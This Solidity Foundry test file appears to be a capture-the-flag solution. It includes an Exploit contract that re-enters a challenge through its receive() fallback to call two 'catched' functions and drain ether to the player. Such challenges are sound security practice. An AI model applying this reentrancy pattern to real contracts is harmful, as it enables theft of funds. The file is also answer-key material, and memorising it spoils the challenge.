// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 2 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "player balance",
            playerAddress.balance,
            18
        );

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Exploit(setup).execute{value: 1 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint(
            "player balance",
            playerAddress.balance,
            18
        );
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit {
    Setup setup;
    bool private flag = false;

    constructor(Setup setup_) payable {
        setup = setup_;
    }

    function execute() external payable {
        setup.rabbitA().catched{value: 1 ether}();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (flag) return;
        flag = true;
        setup.rabbitB().catched{value: 1 ether}();
    }
}
////////// YOUR CODE END //////////
